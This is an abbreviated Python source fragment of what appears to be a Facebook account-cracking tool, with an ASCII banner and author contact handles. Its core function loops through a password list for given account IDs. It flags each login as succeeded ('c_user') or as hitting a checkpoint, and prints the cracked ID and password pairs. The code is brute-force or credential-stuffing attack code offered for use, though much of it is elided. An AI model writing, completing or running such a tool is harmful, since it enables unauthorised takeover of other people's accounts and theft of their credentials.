...
loop=0
#------------logo------------#
logo=('''\033[1;92m _____ _    ____      _    __  __  ___ _____
|  ___/ \  |  _ \    / \  |  \/  |/ _ \__  /
| |_ / _ \ | |_) |  / _ \ | |\/| | | | |/ /
|  _/ ___ \|  _ <  / ___ \| |  | | |_| / /_
...
def clear():
    ...
    print(logo)
    print(40*'-')
    print(F'[{G}+{R}]FACEBOOK : HáMëd Jøö')
    print(F'[{G}+{B}]Telegram  : Ahmadi_4576')
...
def Main():
    ...
    if user in ['01','1']:
        ...
        sy('xdg-open https://www.facebook.com/profile.php?id=100078297285634')
    elif user in ['00','0']:
...
def M1(ids,passlist):
    ...
    global cps
    global loop
    sys.stdout.write(F'\r\r{P}[HaMed] %s|{G}OK:-%s'%(loop,len(oks))),sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in req:
                print(F'\r\r {G}HaMed-OK '+ids+' | '+pas+'{W}')
                oks.append(ids)
                break
            elif 'checkpoint' in req:
                print(F'\r\r {R}HaMed-CP '+ids+' | '+pas+'{W}')
                cps.append(ids)
                break
            else:
                continue
